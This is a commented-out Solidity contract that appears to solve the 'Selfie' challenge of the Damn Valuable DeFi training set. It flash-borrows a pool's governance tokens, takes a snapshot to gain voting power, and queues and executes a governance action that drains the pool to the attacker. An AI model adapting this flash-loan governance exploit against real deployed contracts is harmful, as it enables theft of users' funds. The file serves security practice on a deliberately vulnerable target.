// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import "../selfie/SelfiePool.sol";

// contract SelfieHack {
//     DamnValuableTokenSnapshot public token;
//     SelfiePool public pool;
//     SimpleGovernance public gov;

//     uint256 actionId;

//     constructor(address _token, address _pool, address _gov) {
//         token = DamnValuableTokenSnapshot(_token);
//         pool = SelfiePool(_pool);
//         gov = SimpleGovernance(_gov);
//     }

//     receive() external payable {}

//     fallback() external payable {
//         token.snapshot();
//         token.transfer(address(pool), token.balanceOf(address(this)));
//     }

//     function attack() external {
//         actionId = gov.queueAction(
//             address(pool),
//             abi.encodeWithSignature(
//                 "drainAllFunds(address)",
//                 address(msg.sender)
//             ),
//             0
//         );

//         pool.flashLoan(
//             address(this),
//             address(token),
//             token.balanceOf(address(pool)),
//             actionId
//         );
//     }

//     function attack2() external {
//         gov.executeAction(actionId);
//     }
// }
